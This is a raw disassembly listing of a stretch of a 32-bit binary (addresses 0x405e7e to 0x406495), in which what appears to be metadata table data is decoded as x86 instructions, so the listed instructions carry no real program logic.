  405e7e:	bc 07 01 00 45       	mov    $0x45000107,%esp
  405e83:	03 b8 07 01 00 61    	add    0x61000107(%eax),%edi
  405e89:	03 bc 07 01 00 25 02 	add    0x2250001(%edi,%eax,1),%edi
  405e90:	01 08                	add    %ecx,(%eax)
  405e92:	06                   	push   %es
  405e93:	00 83 0b bc 07 06    	add    %al,0x607bc0b(%ebx)
  405e99:	00 0e                	add    %cl,(%esi)
  405e9b:	14 ed                	adc    $0xed,%al
  405e9d:	07                   	pop    %es
  405e9e:	01 00                	add    %eax,(%eax)
  405ea0:	c4 02                	les    (%edx),%eax
  405ea2:	d2 07                	rolb   %cl,(%edi)
  405ea4:	01 00                	add    %eax,(%eax)
  405ea6:	25 02 01 08 06       	and    $0x6080102,%eax
  405eab:	00 83 0b bc 07 06    	add    %al,0x607bc0b(%ebx)
  405eb1:	00 0e                	add    %cl,(%esi)
  405eb3:	14 ed                	adc    $0xed,%al
  405eb5:	07                   	pop    %es
  405eb6:	01 00                	add    %eax,(%eax)
  405eb8:	25 02 01 08 50       	and    $0x50080102,%eax
  405ebd:	20 00                	and    %al,(%eax)
  405ebf:	00 00                	add    %al,(%eax)
  405ec1:	00 96 00 21 1c c3    	add    %dl,-0x3ce3df00(%esi)
  405ec7:	04 01                	add    $0x1,%al
  405ec9:	00 00                	add    %al,(%eax)
  405ecb:	00 00                	add    %al,(%eax)
  405ecd:	00 80 00 91 20 1e    	add    %al,0x1e209100(%eax)
  405ed3:	1a 36                	sbb    (%esi),%dh
  405ed5:	08 01                	or     %al,(%ecx)
  405ed7:	00 00                	add    %al,(%eax)
  405ed9:	00 00                	add    %al,(%eax)
  405edb:	00 80 00 91 20 7b    	add    %al,0x7b209100(%eax)
  405ee1:	08 3c 08             	or     %bh,(%eax,%ecx,1)
  405ee4:	03 00                	add    (%eax),%eax
  405ee6:	00 00                	add    %al,(%eax)
  405ee8:	00 00                	add    %al,(%eax)
  405eea:	80 00 91             	addb   $0x91,(%eax)
  405eed:	20 08                	and    %cl,(%eax)
  405eef:	1b 41 08             	sbb    0x8(%ecx),%eax
  405ef2:	04 00                	add    $0x0,%al
  405ef4:	40                   	inc    %eax
  405ef5:	21 00                	and    %eax,(%eax)
  405ef7:	00 00                	add    %al,(%eax)
  405ef9:	00 96 00 b0 19 c3    	add    %dl,-0x3ce65000(%esi)
  405eff:	04 08                	add    $0x8,%al
  405f01:	00 a4 21 00 00 00 00 	add    %ah,0x0(%ecx,%eiz,1)
  405f08:	96                   	xchg   %eax,%esi
  405f09:	00 b7 0a c3 04 08    	add    %dh,0x804c30a(%edi)
  405f0f:	00 00                	add    %al,(%eax)
  405f11:	00 00                	add    %al,(%eax)
  405f13:	00 80 00 91 20 1d    	add    %al,0x1d209100(%eax)
  405f19:	0b e4                	or     %esp,%esp
  405f1b:	01 08                	add    %ecx,(%eax)
  405f1d:	00 54 22 00          	add    %dl,0x0(%edx,%eiz,1)
  405f21:	00 00                	add    %al,(%eax)
  405f23:	00 96 00 23 1e c3    	add    %dl,-0x3ce1dd00(%esi)
  405f29:	04 08                	add    $0x8,%al
  405f2b:	00 7c 22 00          	add    %bh,0x0(%edx,%eiz,1)
  405f2f:	00 00                	add    %al,(%eax)
  405f31:	00 96 00 a2 0d c3    	add    %dl,-0x3cf25e00(%esi)
  405f37:	04 08                	add    $0x8,%al
  405f39:	00 90 22 00 00 00    	add    %dl,0x22(%eax)
  405f3f:	00 91 00 be 0d c3    	add    %dl,-0x3cf24200(%ecx)
  405f45:	04 08                	add    $0x8,%al
  405f47:	00 08                	add    %cl,(%eax)
  405f49:	24 00                	and    $0x0,%al
  405f4b:	00 00                	add    %al,(%eax)
  405f4d:	00 96 00 21 1c c3    	add    %dl,-0x3ce3df00(%esi)
  405f53:	04 08                	add    $0x8,%al
  405f55:	00 28                	add    %ch,(%eax)
  405f57:	24 00                	and    $0x0,%al
  405f59:	00 00                	add    %al,(%eax)
  405f5b:	00 91 00 b7 13 c3    	add    %dl,-0x3cec4900(%ecx)
  405f61:	04 08                	add    $0x8,%al
  405f63:	00 dc                	add    %bl,%ah
  405f65:	24 00                	and    $0x0,%al
  405f67:	00 00                	add    %al,(%eax)
  405f69:	00 96 00 c1 13 c3    	add    %dl,-0x3cec3f00(%esi)
  405f6f:	04 08                	add    $0x8,%al
  405f71:	00 e4                	add    %ah,%ah
  405f73:	24 00                	and    $0x0,%al
  405f75:	00 00                	add    %al,(%eax)
  405f77:	00 91 18 c5 15 c3    	add    %dl,-0x3cea3ae8(%ecx)
  405f7d:	04 08                	add    $0x8,%al
  405f7f:	00 00                	add    %al,(%eax)
  405f81:	00 00                	add    %al,(%eax)
  405f83:	00 80 00 91 20 de    	add    %al,-0x21df6f00(%eax)
  405f89:	19 4a 08             	sbb    %ecx,0x8(%edx)
  405f8c:	08 00                	or     %al,(%eax)
  405f8e:	00 00                	add    %al,(%eax)
  405f90:	00 00                	add    %al,(%eax)
  405f92:	80 00 91             	addb   $0x91,(%eax)
  405f95:	20 7e 1d             	and    %bh,0x1d(%esi)
  405f98:	51                   	push   %ecx
  405f99:	08 0b                	or     %cl,(%ebx)
  405f9b:	00 00                	add    %al,(%eax)
  405f9d:	00 00                	add    %al,(%eax)
  405f9f:	00 80 00 91 20 4f    	add    %al,0x4f209100(%eax)
  405fa5:	1e                   	push   %ds
  405fa6:	5a                   	pop    %edx
  405fa7:	08 10                	or     %dl,(%eax)
  405fa9:	00 00                	add    %al,(%eax)
  405fab:	00 00                	add    %al,(%eax)
  405fad:	00 80 00 91 20 0b    	add    %al,0xb209100(%eax)
  405fb3:	06                   	push   %es
  405fb4:	65 08 15 00 00 00 00 	or     %dl,%gs:0x0
  405fbb:	00 80 00 91 20 8b    	add    %al,-0x74df6f00(%eax)
  405fc1:	08 71 08             	or     %dh,0x8(%ecx)
  405fc4:	1c 00                	sbb    $0x0,%al
  405fc6:	f8                   	clc
  405fc7:	24 00                	and    $0x0,%al
  405fc9:	00 00                	add    %al,(%eax)
  405fcb:	00 96 00 b2 1d 4e    	add    %dl,0x4e1db200(%esi)
  405fd1:	01 1d 00 4c 25 00    	add    %ebx,0x254c00
  405fd7:	00 00                	add    %al,(%eax)
  405fd9:	00 96 00 e3 1a 76    	add    %dl,0x761ae300(%esi)
  405fdf:	08 1e                	or     %bl,(%esi)
  405fe1:	00 20                	add    %ah,(%eax)
  405fe3:	26 00 00             	add    %al,%es:(%eax)
  405fe6:	00 00                	add    %al,(%eax)
  405fe8:	91                   	xchg   %eax,%ecx
  405fe9:	00 f0                	add    %dh,%al
  405feb:	11 7d 08             	adc    %edi,0x8(%ebp)
  405fee:	20 00                	and    %al,(%eax)
  405ff0:	44                   	inc    %esp
  405ff1:	26 00 00             	add    %al,%es:(%eax)
  405ff4:	00 00                	add    %al,(%eax)
  405ff6:	86 18                	xchg   %bl,(%eax)
  405ff8:	bf 15 06 00 21       	mov    $0x21000615,%edi
  405ffd:	00 00                	add    %al,(%eax)
  405fff:	00 00                	add    %al,(%eax)
  406001:	00 80 00 91 20 36    	add    %al,0x36209100(%eax)
  406007:	1e                   	push   %ds
  406008:	3c 08                	cmp    $0x8,%al
  40600a:	21 00                	and    %eax,(%eax)
  40600c:	00 00                	add    %al,(%eax)
  40600e:	00 00                	add    %al,(%eax)
  406010:	80 00 91             	addb   $0x91,(%eax)
  406013:	20 1e                	and    %bl,(%esi)
  406015:	1a 36                	sbb    (%esi),%dh
  406017:	08 22                	or     %ah,(%edx)
  406019:	00 00                	add    %al,(%eax)
  40601b:	00 00                	add    %al,(%eax)
  40601d:	00 80 00 91 20 08    	add    %al,0x8209100(%eax)
  406023:	1b 41 08             	sbb    0x8(%ecx),%eax
  406026:	24 00                	and    $0x0,%al
  406028:	4c                   	dec    %esp
  406029:	26 00 00             	add    %al,%es:(%eax)
  40602c:	00 00                	add    %al,(%eax)
  40602e:	96                   	xchg   %eax,%esi
  40602f:	00 07                	add    %al,(%edi)
  406031:	11 c3                	adc    %eax,%ebx
  406033:	04 28                	add    $0x28,%al
  406035:	00 00                	add    %al,(%eax)
  406037:	00 00                	add    %al,(%eax)
  406039:	00 80 00 91 20 1e    	add    %al,0x1e209100(%eax)
  40603f:	1a 36                	sbb    (%esi),%dh
  406041:	08 28                	or     %ch,(%eax)
  406043:	00 00                	add    %al,(%eax)
  406045:	00 00                	add    %al,(%eax)
  406047:	00 80 00 91 20 7b    	add    %al,0x7b209100(%eax)
  40604d:	08 3c 08             	or     %bh,(%eax,%ecx,1)
  406050:	2a 00                	sub    (%eax),%al
  406052:	00 00                	add    %al,(%eax)
  406054:	00 00                	add    %al,(%eax)
  406056:	80 00 91             	addb   $0x91,(%eax)
  406059:	20 08                	and    %cl,(%eax)
  40605b:	1b 41 08             	sbb    0x8(%ecx),%eax
  40605e:	2b 00                	sub    (%eax),%eax
  406060:	d8 26                	fsubs  (%esi)
  406062:	00 00                	add    %al,(%eax)
  406064:	00 00                	add    %al,(%eax)
  406066:	96                   	xchg   %eax,%esi
  406067:	00 98 19 c3 04 2f    	add    %bl,0x2f04c319(%eax)
  40606d:	00 3c 27             	add    %bh,(%edi,%eiz,1)
  406070:	00 00                	add    %al,(%eax)
  406072:	00 00                	add    %al,(%eax)
  406074:	96                   	xchg   %eax,%esi
  406075:	00 11                	add    %dl,(%ecx)
  406077:	13 b7 00 2f 00 00    	adc    0x2f00(%edi),%esi
  40607d:	00 00                	add    %al,(%eax)
  40607f:	00 80 00 91 20 53    	add    %al,0x53209100(%eax)
  406085:	10 83 08 30 00 50    	adc    %al,0x50003008(%ebx)
  40608b:	28 00                	sub    %al,(%eax)
  40608d:	00 00                	add    %al,(%eax)
  40608f:	00 96 00 2b 10 e4    	add    %dl,-0x1befd500(%esi)
  406095:	01 33                	add    %esi,(%ebx)
  406097:	00 84 28 00 00 00 00 	add    %al,0x0(%eax,%ebp,1)
  40609e:	96                   	xchg   %eax,%esi
  40609f:	00 38                	add    %bh,(%eax)
  4060a1:	10 e4                	adc    %ah,%ah
  4060a3:	01 33                	add    %esi,(%ebx)
  4060a5:	00 b8 28 00 00 00    	add    %bh,0x28(%eax)
  4060ab:	00 96 00 21 1c c3    	add    %dl,-0x3ce3df00(%esi)
  4060b1:	04 33                	add    $0x33,%al
  4060b3:	00 20                	add    %ah,(%eax)
  4060b5:	29 00                	sub    %eax,(%eax)
  4060b7:	00 00                	add    %al,(%eax)
  4060b9:	00 91 00 c8 11 c3    	add    %dl,-0x3cee3800(%ecx)
  4060bf:	04 33                	add    $0x33,%al
  4060c1:	00 b4 29 00 00 00 00 	add    %dh,0x0(%ecx,%ebp,1)
  4060c8:	91                   	xchg   %eax,%ecx
  4060c9:	00 22                	add    %ah,(%edx)
  4060cb:	07                   	pop    %es
  4060cc:	eb 02                	jmp    0x4060d0
  4060ce:	33 00                	xor    (%eax),%eax
  4060d0:	54                   	push   %esp
  4060d1:	2a 00                	sub    (%eax),%al
  4060d3:	00 00                	add    %al,(%eax)
  4060d5:	00 96 00 21 1c c3    	add    %dl,-0x3ce3df00(%esi)
  4060db:	04 34                	add    $0x34,%al
  4060dd:	00 1c 2b             	add    %bl,(%ebx,%ebp,1)
  4060e0:	00 00                	add    %al,(%eax)
  4060e2:	00 00                	add    %al,(%eax)
  4060e4:	96                   	xchg   %eax,%esi
  4060e5:	00 c5                	add    %al,%ch
  4060e7:	04 e4                	add    $0xe4,%al
  4060e9:	01 34 00             	add    %esi,(%eax,%eax,1)
  4060ec:	7b 2b                	jnp    0x406119
  4060ee:	00 00                	add    %al,(%eax)
  4060f0:	00 00                	add    %al,(%eax)
  4060f2:	91                   	xchg   %eax,%ecx
  4060f3:	00 5c 06 e4          	add    %bl,-0x1c(%esi,%eax,1)
  4060f7:	01 34 00             	add    %esi,(%eax,%eax,1)
  4060fa:	8c 2b                	mov    %gs,(%ebx)
  4060fc:	00 00                	add    %al,(%eax)
  4060fe:	00 00                	add    %al,(%eax)
  406100:	91                   	xchg   %eax,%ecx
  406101:	00 a0 0e e4 01 34    	add    %ah,0x3401e40e(%eax)
  406107:	00 00                	add    %al,(%eax)
  406109:	2c 00                	sub    $0x0,%al
  40610b:	00 00                	add    %al,(%eax)
  40610d:	00 91 00 7e 0e e4    	add    %dl,-0x1bf18200(%ecx)
  406113:	01 34 00             	add    %esi,(%eax,%eax,1)
  406116:	74 2c                	je     0x406144
  406118:	00 00                	add    %al,(%eax)
  40611a:	00 00                	add    %al,(%eax)
  40611c:	91                   	xchg   %eax,%ecx
  40611d:	00 b7 04 e4 01 34    	add    %dh,0x3401e404(%edi)
  406123:	00 7c 2d 00          	add    %bh,0x0(%ebp,%ebp,1)
  406127:	00 00                	add    %al,(%eax)
  406129:	00 91 00 3d 1b e4    	add    %dl,-0x1be4c300(%ecx)
  40612f:	01 34 00             	add    %esi,(%eax,%eax,1)
  406132:	e8 2d 00 00 00       	call   0x406164
  406137:	00 91 00 9e 1d e4    	add    %dl,-0x1be26200(%ecx)
  40613d:	01 34 00             	add    %esi,(%eax,%eax,1)
  406140:	30 2e                	xor    %ch,(%esi)
  406142:	00 00                	add    %al,(%eax)
  406144:	00 00                	add    %al,(%eax)
  406146:	91                   	xchg   %eax,%ecx
  406147:	00 06                	add    %al,(%esi)
  406149:	1a e4                	sbb    %ah,%ah
  40614b:	01 34 00             	add    %esi,(%eax,%eax,1)
  40614e:	e8 2e 00 00 00       	call   0x406181
  406153:	00 91 00 3b 16 e4    	add    %dl,-0x1be9c500(%ecx)
  406159:	01 34 00             	add    %esi,(%eax,%eax,1)
  40615c:	54                   	push   %esp
  40615d:	30 00                	xor    %al,(%eax)
  40615f:	00 00                	add    %al,(%eax)
  406161:	00 91 00 b4 16 e4    	add    %dl,-0x1be94c00(%ecx)
  406167:	01 34 00             	add    %esi,(%eax,%eax,1)
  40616a:	5c                   	pop    %esp
  40616b:	31 00                	xor    %eax,(%eax)
  40616d:	00 00                	add    %al,(%eax)
  40616f:	00 91 18 c5 15 c3    	add    %dl,-0x3cea3ae8(%ecx)
  406175:	04 34                	add    $0x34,%al
  406177:	00 50 33             	add    %dl,0x33(%eax)
  40617a:	00 00                	add    %al,(%eax)
  40617c:	00 00                	add    %al,(%eax)
  40617e:	96                   	xchg   %eax,%esi
  40617f:	00 27                	add    %ah,(%edi)
  406181:	08 c3                	or     %al,%bl
  406183:	04 34                	add    $0x34,%al
  406185:	00 c4                	add    %al,%ah
  406187:	33 00                	xor    (%eax),%eax
  406189:	00 00                	add    %al,(%eax)
  40618b:	00 91 00 29 0f 4a    	add    %dl,0x4a0f2900(%ecx)
  406191:	01 34 00             	add    %esi,(%eax,%eax,1)
  406194:	f0 33 00             	lock xor (%eax),%eax
  406197:	00 00                	add    %al,(%eax)
  406199:	00 91 00 8b 1c fc    	add    %dl,-0x3e37500(%ecx)
  40619f:	02 34 00             	add    (%eax,%eax,1),%dh
  4061a2:	c8 34 00 00          	enter  $0x34,$0x0
  4061a6:	00 00                	add    %al,(%eax)
  4061a8:	91                   	xchg   %eax,%ecx
  4061a9:	18 c5                	sbb    %al,%ch
  4061ab:	15 c3 04 36 00       	adc    $0x3604c3,%eax
  4061b0:	f8                   	clc
  4061b1:	34 00                	xor    $0x0,%al
  4061b3:	00 00                	add    %al,(%eax)
  4061b5:	00 96 00 40 05 8a    	add    %dl,-0x75fac000(%esi)
  4061bb:	08 36                	or     %dh,(%esi)
  4061bd:	00 34 35 00 00 00 00 	add    %dh,0x0(,%esi,1)
  4061c4:	91                   	xchg   %eax,%ecx
  4061c5:	00 3e                	add    %bh,(%esi)
  4061c7:	08 68 00             	or     %ch,0x0(%eax)
  4061ca:	36 00 d8             	ss add %bl,%al
  4061cd:	35 00 00 00 00       	xor    $0x0,%eax
  4061d2:	91                   	xchg   %eax,%ecx
  4061d3:	00 5c 14 90          	add    %bl,-0x70(%esp,%edx,1)
  4061d7:	08 37                	or     %dh,(%edi)
  4061d9:	00 00                	add    %al,(%eax)
  4061db:	37                   	aaa
  4061dc:	00 00                	add    %al,(%eax)
  4061de:	00 00                	add    %al,(%eax)
  4061e0:	91                   	xchg   %eax,%ecx
  4061e1:	00 22                	add    %ah,(%edx)
  4061e3:	07                   	pop    %es
  4061e4:	eb 02                	jmp    0x4061e8
  4061e6:	38 00                	cmp    %al,(%eax)
  4061e8:	b0 37                	mov    $0x37,%al
  4061ea:	00 00                	add    %al,(%eax)
  4061ec:	00 00                	add    %al,(%eax)
  4061ee:	91                   	xchg   %eax,%ecx
  4061ef:	00 69 1b             	add    %ch,0x1b(%ecx)
  4061f2:	4a                   	dec    %edx
  4061f3:	01 39                	add    %edi,(%ecx)
  4061f5:	00 50 38             	add    %dl,0x38(%eax)
  4061f8:	00 00                	add    %al,(%eax)
  4061fa:	00 00                	add    %al,(%eax)
  4061fc:	91                   	xchg   %eax,%ecx
  4061fd:	00 f3                	add    %dh,%bl
  4061ff:	0d 68 00 39 00       	or     $0x390068,%eax
  406204:	b0 38                	mov    $0x38,%al
  406206:	00 00                	add    %al,(%eax)
  406208:	00 00                	add    %al,(%eax)
  40620a:	91                   	xchg   %eax,%ecx
  40620b:	00 bd 11 97 08 3a    	add    %bh,0x3a089711(%ebp)
  406211:	00 0c 39             	add    %cl,(%ecx,%edi,1)
  406214:	00 00                	add    %al,(%eax)
  406216:	00 00                	add    %al,(%eax)
  406218:	91                   	xchg   %eax,%ecx
  406219:	00 af 1b 68 00 3d    	add    %ch,0x3d00681b(%edi)
  40621f:	00 70 39             	add    %dh,0x39(%eax)
  406222:	00 00                	add    %al,(%eax)
  406224:	00 00                	add    %al,(%eax)
  406226:	91                   	xchg   %eax,%ecx
  406227:	00 74 05 9e          	add    %dh,-0x62(%ebp,%eax,1)
  40622b:	08 3e                	or     %bh,(%esi)
  40622d:	00 bb 39 00 00 00    	add    %bh,0x39(%ebx)
  406233:	00 96 00 85 14 c3    	add    %dl,-0x3ceb7b00(%esi)
  406239:	04 40                	add    $0x40,%al
  40623b:	00 c8                	add    %cl,%al
  40623d:	39 00                	cmp    %eax,(%eax)
  40623f:	00 00                	add    %al,(%eax)
  406241:	00 91 18 c5 15 c3    	add    %dl,-0x3cea3ae8(%ecx)
  406247:	04 40                	add    $0x40,%al
  406249:	00 68 3a             	add    %ch,0x3a(%eax)
  40624c:	00 00                	add    %al,(%eax)
  40624e:	00 00                	add    %al,(%eax)
  406250:	96                   	xchg   %eax,%esi
  406251:	00 23                	add    %ah,(%ebx)
  406253:	1e                   	push   %ds
  406254:	c3                   	ret
  406255:	04 40                	add    $0x40,%al
  406257:	00 9c 3a 00 00 00 00 	add    %bl,0x0(%edx,%edi,1)
  40625e:	91                   	xchg   %eax,%ecx
  40625f:	00 55 09             	add    %dl,0x9(%ebp)
  406262:	4a                   	dec    %edx
  406263:	01 40 00             	add    %eax,0x0(%eax)
  406266:	fc                   	cld
  406267:	3a 00                	cmp    (%eax),%al
  406269:	00 00                	add    %al,(%eax)
  40626b:	00 91 00 f0 07 b7    	add    %dl,-0x48f81000(%ecx)
  406271:	00 40 00             	add    %al,0x0(%eax)
  406274:	44                   	inc    %esp
  406275:	3b 00                	cmp    (%eax),%eax
  406277:	00 00                	add    %al,(%eax)
  406279:	00 91 00 a1 1e b7    	add    %dl,-0x48e15f00(%ecx)
  40627f:	00 41 00             	add    %al,0x0(%ecx)
  406282:	a0 3b 00 00 00       	mov    0x3b,%al
  406287:	00 91 00 0f 10 b7    	add    %dl,-0x48eff100(%ecx)
  40628d:	00 42 00             	add    %al,0x0(%edx)
  406290:	24 3c                	and    $0x3c,%al
  406292:	00 00                	add    %al,(%eax)
  406294:	00 00                	add    %al,(%eax)
  406296:	91                   	xchg   %eax,%ecx
  406297:	00 f0                	add    %dh,%al
  406299:	16                   	push   %ss
  40629a:	b7 00                	mov    $0x0,%bh
  40629c:	43                   	inc    %ebx
  40629d:	00 c0                	add    %al,%al
  40629f:	3c 00                	cmp    $0x0,%al
  4062a1:	00 00                	add    %al,(%eax)
  4062a3:	00 91 00 af 15 e4    	add    %dl,-0x1bea5100(%ecx)
  4062a9:	01 44 00 fc          	add    %eax,-0x4(%eax,%eax,1)
  4062ad:	3c 00                	cmp    $0x0,%al
  4062af:	00 00                	add    %al,(%eax)
  4062b1:	00 91 18 c5 15 c3    	add    %dl,-0x3cea3ae8(%ecx)
  4062b7:	04 44                	add    $0x44,%al
  4062b9:	00 3c 3d 00 00 00 00 	add    %bh,0x0(,%edi,1)
  4062c0:	91                   	xchg   %eax,%ecx
  4062c1:	00 f0                	add    %dh,%al
  4062c3:	11 8a 08 44 00 77    	adc    %ecx,0x77004408(%edx)
  4062c9:	3d 00 00 00 00       	cmp    $0x0,%eax
  4062ce:	91                   	xchg   %eax,%ecx
  4062cf:	18 c5                	sbb    %al,%ch
  4062d1:	15 c3 04 44 00       	adc    $0x4404c3,%eax
  4062d6:	84 3d 00 00 00 00    	test   %bh,0x0
  4062dc:	96                   	xchg   %eax,%esi
  4062dd:	00 46 06             	add    %al,0x6(%esi)
  4062e0:	c3                   	ret
  4062e1:	04 44                	add    $0x44,%al
  4062e3:	00 50 3e             	add    %dl,0x3e(%eax)
  4062e6:	00 00                	add    %al,(%eax)
  4062e8:	00 00                	add    %al,(%eax)
  4062ea:	91                   	xchg   %eax,%ecx
  4062eb:	00 9e 10 a6 08 44    	add    %bl,0x4408a610(%esi)
  4062f1:	00 84 3e 00 00 00 00 	add    %al,0x0(%esi,%edi,1)
  4062f8:	91                   	xchg   %eax,%ecx
  4062f9:	18 c5                	sbb    %al,%ch
  4062fb:	15 c3 04 46 00       	adc    $0x4604c3,%eax
  406300:	d8 3e                	fdivrs (%esi)
  406302:	00 00                	add    %al,(%eax)
  406304:	00 00                	add    %al,(%eax)
  406306:	96                   	xchg   %eax,%esi
  406307:	00 21                	add    %ah,(%ecx)
  406309:	1c c3                	sbb    $0xc3,%al
  40630b:	04 46                	add    $0x46,%al
  40630d:	00 2c 3f             	add    %ch,(%edi,%edi,1)
  406310:	00 00                	add    %al,(%eax)
  406312:	00 00                	add    %al,(%eax)
  406314:	96                   	xchg   %eax,%esi
  406315:	00 c1                	add    %al,%cl
  406317:	13 c3                	adc    %ebx,%eax
  406319:	04 46                	add    $0x46,%al
  40631b:	00 48 3f             	add    %cl,0x3f(%eax)
  40631e:	00 00                	add    %al,(%eax)
  406320:	00 00                	add    %al,(%eax)
  406322:	91                   	xchg   %eax,%ecx
  406323:	00 5c 05 8a          	add    %bl,-0x76(%ebp,%eax,1)
  406327:	08 46 00             	or     %al,0x0(%esi)
  40632a:	84 3f                	test   %bh,(%edi)
  40632c:	00 00                	add    %al,(%eax)
  40632e:	00 00                	add    %al,(%eax)
  406330:	91                   	xchg   %eax,%ecx
  406331:	00 99 0b b7 00 46    	add    %bl,0x4600b70b(%ecx)
  406337:	00 b8 3f 00 00 00    	add    %bh,0x3f(%eax)
  40633d:	00 91 18 c5 15 c3    	add    %dl,-0x3cea3ae8(%ecx)
  406343:	04 47                	add    $0x47,%al
  406345:	00 cc                	add    %cl,%ah
  406347:	3f                   	aas
  406348:	00 00                	add    %al,(%eax)
  40634a:	00 00                	add    %al,(%eax)
  40634c:	96                   	xchg   %eax,%esi
  40634d:	00 54 0e c3          	add    %dl,-0x3d(%esi,%ecx,1)
  406351:	04 47                	add    $0x47,%al
  406353:	00 1a                	add    %bl,(%edx)
  406355:	40                   	inc    %eax
  406356:	00 00                	add    %al,(%eax)
  406358:	00 00                	add    %al,(%eax)
  40635a:	96                   	xchg   %eax,%esi
  40635b:	00 46 0e             	add    %al,0xe(%esi)
  40635e:	c3                   	ret
  40635f:	04 47                	add    $0x47,%al
  406361:	00 34 40             	add    %dh,(%eax,%eax,2)
  406364:	00 00                	add    %al,(%eax)
  406366:	00 00                	add    %al,(%eax)
  406368:	91                   	xchg   %eax,%ecx
  406369:	00 4c 05 8a          	add    %cl,-0x76(%ebp,%eax,1)
  40636d:	08 47 00             	or     %al,0x0(%edi)
  406370:	70 40                	jo     0x4063b2
  406372:	00 00                	add    %al,(%eax)
  406374:	00 00                	add    %al,(%eax)
  406376:	91                   	xchg   %eax,%ecx
  406377:	00 3e                	add    %bh,(%esi)
  406379:	09 ac 08 47 00 e4 40 	or     %ebp,0x40e40047(%eax,%ecx,1)
  406380:	00 00                	add    %al,(%eax)
  406382:	00 00                	add    %al,(%eax)
  406384:	91                   	xchg   %eax,%ecx
  406385:	00 95 0b b7 00 48    	add    %dl,0x4800b70b(%ebp)
  40638b:	00 18                	add    %bl,(%eax)
  40638d:	41                   	inc    %ecx
  40638e:	00 00                	add    %al,(%eax)
  406390:	00 00                	add    %al,(%eax)
  406392:	91                   	xchg   %eax,%ecx
  406393:	18 c5                	sbb    %al,%ch
  406395:	15 c3 04 49 00       	adc    $0x4904c3,%eax
  40639a:	74 41                	je     0x4063dd
  40639c:	00 00                	add    %al,(%eax)
  40639e:	00 00                	add    %al,(%eax)
  4063a0:	96                   	xchg   %eax,%esi
  4063a1:	00 2b                	add    %ch,(%ebx)
  4063a3:	06                   	push   %es
  4063a4:	c3                   	ret
  4063a5:	04 49                	add    $0x49,%al
  4063a7:	00 28                	add    %ch,(%eax)
  4063a9:	42                   	inc    %edx
  4063aa:	00 00                	add    %al,(%eax)
  4063ac:	00 00                	add    %al,(%eax)
  4063ae:	91                   	xchg   %eax,%ecx
  4063af:	00 7c 1c b1          	add    %bh,-0x4f(%esp,%ebx,1)
  4063b3:	08 49 00             	or     %cl,0x0(%ecx)
  4063b6:	e0 42                	loopne 0x4063fa
  4063b8:	00 00                	add    %al,(%eax)
  4063ba:	00 00                	add    %al,(%eax)
  4063bc:	86 18                	xchg   %bl,(%eax)
  4063be:	bf 15 06 00 4c       	mov    $0x4c000615,%edi
  4063c3:	00 e8                	add    %ch,%al
  4063c5:	42                   	inc    %edx
  4063c6:	00 00                	add    %al,(%eax)
  4063c8:	00 00                	add    %al,(%eax)
  4063ca:	83 00 8c             	addl   $0xffffff8c,(%eax)
  4063cd:	01 06                	add    %eax,(%esi)
  4063cf:	00 4c 00 fc          	add    %cl,-0x4(%eax,%eax,1)
  4063d3:	42                   	inc    %edx
  4063d4:	00 00                	add    %al,(%eax)
  4063d6:	00 00                	add    %al,(%eax)
  4063d8:	86 18                	xchg   %bl,(%eax)
  4063da:	bf 15 06 00 4c       	mov    $0x4c000615,%edi
  4063df:	00 04 43             	add    %al,(%ebx,%eax,2)
  4063e2:	00 00                	add    %al,(%eax)
  4063e4:	00 00                	add    %al,(%eax)
  4063e6:	83 00 9c             	addl   $0xffffff9c,(%eax)
  4063e9:	01 b8 08 4c 00 15    	add    %edi,0x15004c08(%eax)
  4063ef:	43                   	inc    %ebx
  4063f0:	00 00                	add    %al,(%eax)
  4063f2:	00 00                	add    %al,(%eax)
  4063f4:	83 00 fc             	addl   $0xfffffffc,(%eax)
  4063f7:	01 bf 02 4d 00 24    	add    %edi,0x24004d02(%edi)
  4063fd:	43                   	inc    %ebx
  4063fe:	00 00                	add    %al,(%eax)
  406400:	00 00                	add    %al,(%eax)
  406402:	86 18                	xchg   %bl,(%eax)
  406404:	bf 15 06 00 4e       	mov    $0x4e000615,%edi
  406409:	00 2c 43             	add    %ch,(%ebx,%eax,2)
  40640c:	00 00                	add    %al,(%eax)
  40640e:	00 00                	add    %al,(%eax)
  406410:	83 00 6d             	addl   $0x6d,(%eax)
  406413:	01 bf 02 4e 00 3a    	add    %edi,0x3a004e02(%edi)
  406419:	43                   	inc    %ebx
  40641a:	00 00                	add    %al,(%eax)
  40641c:	00 00                	add    %al,(%eax)
  40641e:	86 18                	xchg   %bl,(%eax)
  406420:	bf 15 06 00 4f       	mov    $0x4f000615,%edi
  406425:	00 42 43             	add    %al,0x43(%edx)
  406428:	00 00                	add    %al,(%eax)
  40642a:	00 00                	add    %al,(%eax)
  40642c:	83 00 4f             	addl   $0x4f,(%eax)
  40642f:	01 bf 02 4f 00 55    	add    %edi,0x55004f02(%edi)
  406435:	43                   	inc    %ebx
  406436:	00 00                	add    %al,(%eax)
  406438:	00 00                	add    %al,(%eax)
  40643a:	86 18                	xchg   %bl,(%eax)
  40643c:	bf 15 06 00 50       	mov    $0x50000615,%edi
  406441:	00 5d 43             	add    %bl,0x43(%ebp)
  406444:	00 00                	add    %al,(%eax)
  406446:	00 00                	add    %al,(%eax)
  406448:	83 00 ff             	addl   $0xffffffff,(%eax)
  40644b:	00 bf 02 50 00 6b    	add    %bh,0x6b005002(%edi)
  406451:	43                   	inc    %ebx
  406452:	00 00                	add    %al,(%eax)
  406454:	00 00                	add    %al,(%eax)
  406456:	83 00 d6             	addl   $0xffffffd6,(%eax)
  406459:	01 bf 02 51 00 79    	add    %edi,0x79005102(%edi)
  40645f:	43                   	inc    %ebx
  406460:	00 00                	add    %al,(%eax)
  406462:	00 00                	add    %al,(%eax)
  406464:	91                   	xchg   %eax,%ecx
  406465:	18 c5                	sbb    %al,%ch
  406467:	15 c3 04 52 00       	adc    $0x5204c3,%eax
  40646c:	85 43 00             	test   %eax,0x0(%ebx)
  40646f:	00 00                	add    %al,(%eax)
  406471:	00 86 18 bf 15 06    	add    %al,0x615bf18(%esi)
  406477:	00 52 00             	add    %dl,0x0(%edx)
  40647a:	8d 43 00             	lea    0x0(%ebx),%eax
  40647d:	00 00                	add    %al,(%eax)
  40647f:	00 83 00 ba 00 06    	add    %al,0x600ba00(%ebx)
  406485:	00 52 00             	add    %dl,0x0(%edx)
  406488:	9e                   	sahf
  406489:	43                   	inc    %ebx
  40648a:	00 00                	add    %al,(%eax)
  40648c:	00 00                	add    %al,(%eax)
  40648e:	86 18                	xchg   %bl,(%eax)
  406490:	bf 15 06 00 52       	mov    $0x52000615,%edi
  406495:	00 a8 43 00 00 00    	add    %ch,0x43(%eax)
